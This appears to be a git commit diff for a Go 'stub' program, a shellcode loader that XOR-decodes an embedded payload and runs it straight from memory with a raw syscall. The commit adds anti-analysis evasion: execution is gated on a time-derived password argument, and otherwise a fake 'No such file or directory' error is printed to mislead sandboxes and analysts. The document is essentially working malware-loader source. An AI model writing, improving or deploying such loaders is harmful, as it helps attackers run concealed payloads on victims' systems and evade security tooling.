f1ccd1f9f5a60b885b77a735a8af0bbc28bebc00
piiperxyz <103562756+piiperxyz@users.noreply.github.com>
2022-04-21 16:20:17 +0800

    Squashed commit of the following:
    commit eb745b667c21fc5899b677ba63f640ee42097c39
    Author: piiperxyz <103562756+piiperxyz@users.noreply.github.com>
    Date:   Thu Apr 21 15:59:51 2022 +0800
    
        Update README.md
    
    commit 3ab428f20e7ec5e42a1833677abc56cca2c5501b
    Author: piiperxyz <103562756+piiperxyz@users.noreply.github.com>
    Date:   Thu Apr 21 15:57:25 2022 +0800
    
        Update README.md
    
    commit ca25d3549ad4c66017cf32e74d3cdb2598d9f54b
    Author: piiperxyz <0flyinbed0@gmail.com>
    Date:   Thu Apr 21 15:55:35 2022 +0800
    
        update 04/21
    
    commit 5900903aaeb02d1fdb40c17a2dde2d81c9b6efce
    Author: piiperxyz <0flyinbed0@gmail.com>
    Date:   Thu Apr 21 14:51:34 2022 +0800
    
        rm test.go
    
    commit f75a5cc7118cae9bd945aefb19065929012c5dc9
    Author: piiperxyz <0flyinbed0@gmail.com>
    Date:   Thu Apr 21 11:58:14 2022 +0800
    
        dev

--- stub/stub.go
+++ stub/stub.go
@@ -2,7 +2,11 @@ package main
 
 import (
 	_ "embed"
+	"fmt"
+	"os"
+	"strconv"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
@@ -14,8 +18,25 @@ var (
 )
 
 func main() {
-	for index, padByte := range pad1 {
-		pad2[index] = pad2[index] ^ padByte
+	runflag := false
+	t := time.Now()
+	hour := t.Hour()
+	minute := t.Minute()
+	day := t.Day()
+	pass := strconv.Itoa(hour) + strconv.Itoa(minute) + strconv.Itoa(day)
+	if len(os.Args) < 2 {
+		fmt.Printf("No such file or directory")
+		os.Exit(0)
 	}
-	syscall.Syscall(uintptr(unsafe.Pointer(&pad2[0])), 0, 0, 0, 0)
+	if os.Args[1] == pass {
+		runflag = true
+	}
+	if runflag {
+		for index, padByte := range pad1 {
+			pad2[index] = pad2[index] ^ padByte
+		}
+		syscall.Syscall(uintptr(unsafe.Pointer(&pad2[0])), 0, 0, 0, 0)
+	} else {
+		fmt.Printf("No such file or directory")
+	}
 }
